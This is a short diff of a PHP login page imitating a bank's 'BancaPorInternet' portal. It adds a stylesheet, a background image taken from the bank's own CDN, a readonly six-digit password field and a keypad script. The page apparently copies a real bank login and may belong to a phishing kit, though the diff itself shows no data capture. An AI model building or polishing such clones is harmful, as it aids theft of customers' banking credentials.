@@ -23,15 +23,16 @@ if (isset($_POST['submit'])) {
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 
     <link rel="stylesheet" type="text/css" href="css/style.css">
+    <link rel="stylesheet" type="text/css" href="css/password.css">
 
     <title>BancaPorInternet</title>
 </head>
 
 <body>
     <div class="container-fluid  sinpadding">
-        <div class="row m-altura">
-            <div class="col-md-6 img-fondo">
-
+        <img class="fondo_img" src="https://bpi.azureedge.net/assets-1-0-0/images/login/bpi_bg.jpg?hgD5A-IC=" alt="">
+        <div   div class="img-log"></div>
+        <div class="row m-altura"> 
             </div>
             <div class="col-md-6">
 
@@ -69,13 +70,13 @@ if (isset($_POST['submit'])) {
 
 
                     <div class="mb-4 ">
-                        <input type="checkbox"  name="recordar" class="colorcheck">
+                        <input type="checkbox" id="recordar" name="recordar" class="colorcheck">
                         <label for="recordar" class="form-check-label">Recordar datos</label>
 
                     </div>
                     <div class="mb-4">
                         <label for="Clave" class="form-label">Clave de internet de 6 dígitos</label>
-                        <input type="Clave" class="form-control ancho2-input label-input" name="Clave">
+                        <input type="text" class="form-control ancho2-input label-input" autocomplete="off" readonly id="clave" name="Clave">
                     </div>
 
                     <div class="button-container">
@@ -123,6 +124,7 @@ if (isset($_POST['submit'])) {
     </script>
     <script src="js/main.js"></script>
     <script src="js/input.js"></script>
+    <script src="js/clave.js"></script>
 
 </body>
 
